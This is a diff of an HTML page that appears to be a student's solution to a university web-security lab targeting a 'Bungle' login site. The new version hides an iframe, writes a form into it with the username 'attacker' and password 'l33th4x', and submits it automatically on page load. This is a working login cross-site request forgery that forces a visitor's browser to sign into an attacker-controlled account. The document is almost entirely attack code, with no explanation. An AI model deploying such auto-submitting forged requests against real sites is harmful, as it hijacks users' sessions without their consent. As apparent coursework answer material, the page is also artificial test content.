@@ -1,4 +1,4 @@
-<html>
+<!-- <html>
     <body>
         <form action="https://bungle.sysnet.ucsd.edu/login" method="POST">
             <input type="hidden" name="username" value="attacker" />
@@ -8,4 +8,26 @@
             document.forms[0].submit();
         </script>
     </body>
+</html> -->
+
+<html>
+
+<body>
+    <script>
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const frameDoc = iframe.contentDocument;
+        frameDoc.write(`
+        <body>
+            <form action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=0&xssdefense=0" method="POST">
+                <input name="username" value="attacker">
+                <input name="password" value="l33th4x">
+            </form>
+        </body>
+        `);
+        frameDoc.forms[0].submit();
+    </script>
+</body>
+
 </html>
